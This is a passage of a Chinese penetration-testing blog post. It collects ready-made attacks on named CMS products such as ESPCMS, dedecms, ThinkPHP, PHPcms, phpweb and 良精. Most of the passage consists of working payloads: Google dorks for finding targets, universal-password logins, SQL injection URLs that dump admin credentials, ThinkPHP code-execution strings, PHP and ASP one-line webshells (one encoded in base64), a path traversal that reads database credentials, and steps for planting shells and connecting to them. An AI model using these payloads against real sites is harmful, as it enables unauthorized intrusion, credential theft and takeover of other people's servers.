<p>直接在网站后台加入代码回车就能爆出帐号密码，再去掉代码加上/admin回车就能直接进后台了。拿shell方法很简单，找到“库项目管理”再选择“配送的方式”，在代码最下面插入php一句话木马： 不行就换php木马的预代码！</p>
<p>接着保存，一句话路径是：<a href="http://www.xxx.org/myship.php" target="_blank" rel="noopener">http://www.xxx.org/myship.php</a> ; 打开“ASP+PHP两用Shell.html”填入地址，点击一下环境变量，成功之后点击上传文件就可以拿shell了。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-帝国cms-6-6最新版本-】"><a href="#【-帝国cms-6-6最新版本-】" class="headerlink" title="【 帝国cms 6.6最新版本 】"></a>【 帝国cms 6.6最新版本 】</h3><p>自定义页面-增加自定义页面-随便写个.php文件名，内容写： </p>
<p>如果内容直接添一句话或者php大马是无用的，因为他会生成xxx.php前先给你执行，</p>
<p>PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 就是 的base64加密。</p>
<p>所以生成xxx.php后 会出现内容 在文件里，然后用菜刀直接连接吧。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-phpweb-】"><a href="#【-phpweb-】" class="headerlink" title="【 phpweb 】"></a>【 phpweb 】</h3><p>关键字：inurl:down/class/index.php?myord=</p>
<p>后台地址：admin.php</p>
<p>万能密码：admin ‘or ‘1’=’1</p>
<p>注入地址：down/class/index.php?myord=1</p>
<p>表段：pwn_base_admin</p>
<p>拿shell通杀漏洞：登入后台–文章–文章发布–文章内容里的图片上传按钮–抓包之后改包NC提交。</p>
<p>也可以用下面的exp拿shell：</p>
<p>用火狐浏览器登录后台，因为火狐浏览器有保留cookies的功能， 找到“phpweb之exp”这个html，拉进火狐浏览器器里上传1.php;.jpg的一句话木马，查看源码菜刀连接！</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【动科-dkcms-漏洞】"><a href="#【动科-dkcms-漏洞】" class="headerlink" title="【动科(dkcms)漏洞】:"></a>【动科(dkcms)漏洞】:</h3><p>官方网站：<a href="http://www.dkcms.com主要是差不多3个版本为主吧，" target="_blank" rel="noopener">www.dkcms.com主要是差不多3个版本为主吧，</a></p>
<p>V2.0 data/dkcm_ssdfhwejkfs.mdb</p>
<p>V3.1 _data/___dkcms_30_free.mdb</p>
<p>V4.2 _data/I^(()UU()H.mdb</p>
<p>默认后台：admin</p>
<p>编辑器：admin/fckeditor</p>
<p>后台拿shell，fck编辑器突破可拿shell</p>
<p>建立asp文件夹</p>
<p>Fck的路径：Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/mk.asp&amp;NewFolderName=mk.asp</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="ESPCMS通杀0day"><a href="#ESPCMS通杀0day" class="headerlink" title="ESPCMS通杀0day :"></a>ESPCMS通杀0day :</h3><p>关键字：inurl:index.php?ac=article&amp;at=read&amp;did=</p>
<p>默认后台：adminsoft/index.php siteadmin/index.php</p>
<p>注入点(爆表前缀)：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>爆帐号：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>爆密码：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>帐号和密码一次性爆：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,password)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>进到后台后，直接点击分类图片-修改-选择文件-直接上传php一句话木马</p>
<p>PS：当上传不了php木马时，去系统设置一下，添加图片上传格式 |php ，这样就可以上传一个图片文件头的php木马。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="Thinkphp框架任意代码执行漏洞"><a href="#Thinkphp框架任意代码执行漏洞" class="headerlink" title="Thinkphp框架任意代码执行漏洞 :"></a>Thinkphp框架任意代码执行漏洞 :</h3><p>ThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架</p>
<p>关键字：thinkphp intitle:系统发生错误</p>
<p>获取Thinkphp的版本号：index.php/module/action/param1/$%7B@print(THINK_VERSION)%7D</p>
<p>获取服务器的配置信息：index.php/module/aciton/param1/${@phpinfo()}</p>
<p>列出网站所有文件列表：index.php/module/action/param1/{${system($_GET[‘x’])}}?x=ls -al</p>
<p>直接在网页执行一句话：index.php/module/action/param1/{${eval($_POST展开)}}</p>
<p>菜刀连接：<a href="http://www.xxx.com/index.php/module/action/param1/{${eval($_POST展开)}}" target="_blank" rel="noopener">http://www.xxx.com/index.php/module/action/param1/{${eval($_POST展开)}}</a> 密码：s</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="良精系统"><a href="#良精系统" class="headerlink" title="良精系统 :"></a>良精系统 :</h3><p>( 爆管理员帐号密码的代码 )</p>
<p>NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20”=’</p>
<p>（ 一句话木马的妙用 ）</p>
<p>插入一句话木马后，连接网站的配置文件：inc/config.asp 密码都是g</p>
<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可 2.网站配置-网站地址-插入闭合的一句话木马：http://”%&gt;&lt;%execute(request(“g”))%&gt;&lt;%’ 3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
<p>（ 利用upfile_other.asp漏洞拿shell ）</p>
<p>直接访问会员中心：userreg.asp</p>
<p>注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer</p>
<p>另外可以利用会员中心的cookies，用火狐浏览器登陆之后，访问upfile_other.asp页面，用抓包工具去抓包，接着用明小子上传拿shell.</p>
<p>（ 上传漏洞 ）</p>
<p>漏洞文件：Upfile_Photo.asp</p>
<p>前提是进入后台了，访问这个文件，将提示“请先选择你要上传的文件！”，用抓包工具抓管理员的cookies，再把上传地址跟cookies扔到名小子里上传拿shell</p>
<h3 id="（-南方在线编辑器-）"><a href="#（-南方在线编辑器-）" class="headerlink" title="（ 南方在线编辑器 ）"></a>（ 南方在线编辑器 ）</h3><p>默认后台：admin/Southidceditor/admin_style.asp</p>
<p>数据库路径：admin/SouthidcEditorDatasSouthidcEditor.mdb</p>
<p>遍历目录：admin/Southidceditor/admin_uploadfile.asp?id=14&amp;dir=../..</p>
<p>文件上传页面：admin/Southidceditor/ewebeditor.asp?id=57&amp;style=southidc</p>
<p>样式设置页面：admin/SouthidcEditor/Admin_Style.asp?action=styleset&amp;id=47</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="dedecms注入漏洞及找后台技巧"><a href="#dedecms注入漏洞及找后台技巧" class="headerlink" title="dedecms注入漏洞及找后台技巧 :"></a>dedecms注入漏洞及找后台技巧 :</h3><p>访问这个：plus/search.php?keyword=as&amp;typeArr[ uNion ]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 1 !那么直接用下面的exp爆出所有管理员的帐号密码：</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+and+(SELECT+1+FROM+(select+count(<em>),concat(floor(rand(0)</em>2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%23@__admin+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@’+]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 2 !</p>
<p>那么直接用下面的exp爆出所有管理员的帐号密码</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%23@__admin%23@’+]=a</p>
<p>有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了</p>
<p>破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可</p>
<p>如何找后台？</p>
<p>默认后台：dede</p>
<p>第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）</p>
<p>第二种方法：把域名作为后台去尝试</p>
<p>第三种方法：查看这个文件：robots.txt</p>
<p>第四种方法：ping下域名获得ip之后，<a href="http://www.bing.com/" target="_blank" rel="noopener">http://www.bing.com/</a> 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="PHPcms-V9-爆数据库信息漏洞"><a href="#PHPcms-V9-爆数据库信息漏洞" class="headerlink" title="PHPcms V9 爆数据库信息漏洞:"></a>PHPcms V9 爆数据库信息漏洞:</h3><p>直接爆出数据库连接信息：/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php</p>
<p>关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码</p>
<p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[0day])’.”rnrn?”.”&gt;rn”);</p>
<p>点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day</p>
<p><br></p>
<center><strong>·End·</strong></center></the></excerpt>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>Title:</span><a href="/Study/penetrating-courses.html">渗透课程</a></p>
        <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
        <p><span class="post-count">Words:</span>24,072</p>
        <p><span class="post-count">Time:</span>93 mins</p>
        <p><span>Created:</span>2017-12-26, 16:42:05</p>
        <p><span>Updated:</span>2018-10-09, 23:33:52</p>
        <p>
            <span>Full URL:</span><a class="post-url" href="/Study/penetrating-courses.html" title="渗透课程">http://blog.0akarma.me/Study/penetrating-courses.html</a>
            <span class="copy-path" data-clipboard-text="From http://blog.0akarma.me/Study/penetrating-courses.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/Life/2017-films.html">
                    2017-films
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/Study/code-audit-bees4.html">
                    代码审计实例-BEES_4.0_R_20160525
                </a>
            </div>
        
    </nav>

  
  
    
    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
      <br>
      <div>如果觉得文章海星，那就打赏一下吧！</div>
      <br>
      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
        <div class="btn btn-pay">打赏支持</div>
      </button>
      <br>
      <br>
      <div id="QR" style="display: none;">
        
        
          <div id="alipay" style="display: inline-block">
            <img id="alipay_qr" src="/img/pay.jpg" alt="KarmA Alipay"/>
            <p>二合一打赏</p>
          </div>
        
        <br>
        <br>
      </div>
    </div>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">Contents</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言-揭开Web渗透与安全的面纱（必看）"><span class="toc-text">前言-揭开Web渗透与安全的面纱（必看）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#服务器是怎么被入侵的"><span class="toc-text">服务器是怎么被入侵的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端所提供的服务"><span class="toc-text">服务端所提供的服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#了解web的基础知识"><span class="toc-text">了解web的基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#怎么攻陷服务器"><span class="toc-text">怎么攻陷服务器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一篇-Web渗透需要接触的语言"><span class="toc-text">第一篇-Web渗透需要接触的语言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#涉及语言："><span class="toc-text">涉及语言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小编说"><span class="toc-text">小编说</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习心得"><span class="toc-text">学习心得</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二篇上-http请求协议的简单描述"><span class="toc-text">第二篇上-http请求协议的简单描述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP协议剖析"><span class="toc-text">HTTP协议剖析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脱离浏览器发起http请求"><span class="toc-text">脱离浏览器发起http请求</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二篇下-HTTP协议的请求与响应深度剖析"><span class="toc-text">第二篇下-HTTP协议的请求与响应深度剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是请求方法？什么是请求头？"><span class="toc-text">什么是请求方法？什么是请求头？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP请求信息由3部分组成："><span class="toc-text">HTTP请求信息由3部分组成：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下面我们来分析一个http请求："><span class="toc-text">下面我们来分析一个http请求：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#我们来对这段请求进行分析："><span class="toc-text">我们来对这段请求进行分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（1）HTTP1-1目前支持以下7种请求方法："><span class="toc-text">（1）HTTP1.1目前支持以下7种请求方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（2）请求头-Request-Header"><span class="toc-text">（2）请求头(Request Header)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常见的MIME类型如下："><span class="toc-text">常见的MIME类型如下：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（3）请求正文"><span class="toc-text">（3）请求正文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP响应格式"><span class="toc-text">HTTP响应格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）状态行"><span class="toc-text">（1）状态行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）响应头"><span class="toc-text">（2）响应头</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第三篇-体验http协议的应用"><span class="toc-text">第三篇-体验http协议的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用HTTP拦截突破前段验证"><span class="toc-text">利用HTTP拦截突破前段验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是前端验证？"><span class="toc-text">什么是前端验证？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何突破验证"><span class="toc-text">如何突破验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何绕过验证"><span class="toc-text">如何绕过验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#软件的使用"><span class="toc-text">软件的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PS"><span class="toc-text">PS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第四篇-Web安全之信息探测"><span class="toc-text">第四篇-Web安全之信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息探测-主要的目的"><span class="toc-text">信息探测,主要的目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用搜索引擎进行信息探测"><span class="toc-text">利用搜索引擎进行信息探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#子域名在线查询工具"><span class="toc-text">子域名在线查询工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具的利用"><span class="toc-text">工具的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap使用命令："><span class="toc-text">nmap使用命令：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第五篇-SQL注入的原理"><span class="toc-text">第五篇-SQL注入的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网站和网页的区别"><span class="toc-text">网站和网页的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例子"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#整型参数的判断"><span class="toc-text">整型参数的判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解内容"><span class="toc-text">猜解内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第六篇-上传漏洞之解析漏洞"><span class="toc-text">第六篇-上传漏洞之解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解析漏洞"><span class="toc-text">解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逻辑导航"><span class="toc-text">逻辑导航</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、IIS解析漏洞"><span class="toc-text">一、IIS解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、Apache解析漏洞"><span class="toc-text">二、Apache解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、PHP-CGI解析漏洞"><span class="toc-text">三、PHP CGI解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第七篇-上传漏洞之绕过上传漏洞"><span class="toc-text">第七篇-上传漏洞之绕过上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、客户端检测绕过方法："><span class="toc-text">一、客户端检测绕过方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、服务器端检测"><span class="toc-text">二、服务器端检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#白名单与黑名单验证"><span class="toc-text">白名单与黑名单验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME验证"><span class="toc-text">MIME验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#目录验证"><span class="toc-text">目录验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#截断上传攻击"><span class="toc-text">截断上传攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第八篇-上传漏洞之文本编辑器上传"><span class="toc-text">第八篇-上传漏洞之文本编辑器上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oday"><span class="toc-text">Oday</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、敏感信息暴露"><span class="toc-text">一、敏感信息暴露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-查看版本信息"><span class="toc-text">1.1 查看版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-默认上传页面"><span class="toc-text">1.2 默认上传页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-其他敏感文件"><span class="toc-text">1.3 其他敏感文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、黑名单策略错误"><span class="toc-text">二、黑名单策略错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、任意文件上传漏洞"><span class="toc-text">三、任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充："><span class="toc-text">补充：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#特别篇-主流网站程序Oday大全以及拿shell思路"><span class="toc-text">特别篇-主流网站程序Oday大全以及拿shell思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#版权和内容说明："><span class="toc-text">版权和内容说明：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见网站程序asp类："><span class="toc-text">常见网站程序asp类：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP类："><span class="toc-text">PHP类：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP程序来源默认绝对路径"><span class="toc-text">PHP程序来源默认绝对路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-谷歌语法-】"><span class="toc-text">【 谷歌语法 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-一句话木马-】"><span class="toc-text">【 一句话木马 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-ewebeditor编辑器-】"><span class="toc-text">【 ewebeditor编辑器 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ewebeditor5-5版本"><span class="toc-text">( ewebeditor5.5版本 )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-fckeditor编辑器-】"><span class="toc-text">【 fckeditor编辑器 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-linux-】"><span class="toc-text">【 linux 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-旁注-】"><span class="toc-text">【 旁注 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-phpmyadmin-】"><span class="toc-text">【 phpmyadmin 】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmyadmin脱裤"><span class="toc-text">phpmyadmin脱裤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-万能密码-】"><span class="toc-text">【 万能密码 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-批量关键词-】"><span class="toc-text">【 批量关键词 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-木马后门-】"><span class="toc-text">【 木马后门 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-安全狗-】"><span class="toc-text">【 安全狗 】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-过注入"><span class="toc-text">1.过注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-过大马被阻拦访问"><span class="toc-text">2.过大马被阻拦访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-过菜刀连接一句话被拦截"><span class="toc-text">3.过菜刀连接一句话被拦截</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-本地构造上传漏洞-】"><span class="toc-text">【 本地构造上传漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-利用双文件上传拿shell-】"><span class="toc-text">【 利用双文件上传拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-本地构造数据库备份突破拿shell-】"><span class="toc-text">【 本地构造数据库备份突破拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-本地构造限制上传类型漏洞-】"><span class="toc-text">【 本地构造限制上传类型漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-抓包改包NC提交拿shell-】"><span class="toc-text">【 抓包改包NC提交拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-抓包nc上传获取管理权限-】"><span class="toc-text">【 抓包nc上传获取管理权限 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-arp欺骗-】"><span class="toc-text">【 arp欺骗 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-突破安全狗防注入及上传-】"><span class="toc-text">【 突破安全狗防注入及上传 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-跨站xss-】"><span class="toc-text">【 跨站xss 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-爆库-】"><span class="toc-text">【 爆库 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-利用sql注入点判断网站和数据库是否站库分离-】"><span class="toc-text">【 利用sql注入点判断网站和数据库是否站库分离 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-iis6-0-PUT写入漏洞-】"><span class="toc-text">【 iis6.0 PUT写入漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-ACCESS执行SQL语句导出一句话拿webshell-】"><span class="toc-text">【 ACCESS执行SQL语句导出一句话拿webshell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-利用过滤’or’-’or’修改代码进行绕过-】"><span class="toc-text">【 利用过滤’or’=’or’修改代码进行绕过 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-动力3-5拿shell-】"><span class="toc-text">【 动力3.5拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-aspcms】"><span class="toc-text">【 aspcms】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-XYCMS企业建站系统-】"><span class="toc-text">【 XYCMS企业建站系统 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-szwyadmin漏洞绕过后台验证-】"><span class="toc-text">【 szwyadmin漏洞绕过后台验证 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-医院建站系统任意文件上传漏洞-】"><span class="toc-text">【 医院建站系统任意文件上传漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-嘉友科技cms上传漏洞-】"><span class="toc-text">【 嘉友科技cms上传漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-ecshopcms后台拿shell-】"><span class="toc-text">【 ecshopcms后台拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-教育站sql注入通杀0day-】"><span class="toc-text">【 教育站sql注入通杀0day 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-IIS7-0-畸形解析漏洞通杀oday-】"><span class="toc-text">【 IIS7.0 畸形解析漏洞通杀oday 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-Yothcms-遍历目录漏洞-】"><span class="toc-text">【 Yothcms 遍历目录漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-传信网络独立开发网站源码0day漏洞-】"><span class="toc-text">【 传信网络独立开发网站源码0day漏洞 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【科讯cms-6-5后台拿shell-】"><span class="toc-text">【科讯cms 6.5后台拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-动易2006后台拿shell-】"><span class="toc-text">【 动易2006后台拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-Shopex4-8-5-注入漏洞后台拿shell-】"><span class="toc-text">【 Shopex4.8.5 注入漏洞后台拿shell 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-ecshop漏洞总汇-】"><span class="toc-text">【 ecshop漏洞总汇 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-帝国cms-6-6最新版本-】"><span class="toc-text">【 帝国cms 6.6最新版本 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【-phpweb-】"><span class="toc-text">【 phpweb 】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【动科-dkcms-漏洞】"><span class="toc-text">【动科(dkcms)漏洞】:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESPCMS通杀0day"><span class="toc-text">ESPCMS通杀0day :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thinkphp框架任意代码执行漏洞"><span class="toc-text">Thinkphp框架任意代码执行漏洞 :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#良精系统"><span class="toc-text">良精系统 :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（-南方在线编辑器-）"><span class="toc-text">（ 南方在线编辑器 ）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms注入漏洞及找后台技巧"><span class="toc-text">dedecms注入漏洞及找后台技巧 :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPcms-V9-爆数据库信息漏洞"><span class="toc-text">PHPcms V9 爆数据库信息漏洞:</span></a></li></ol></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

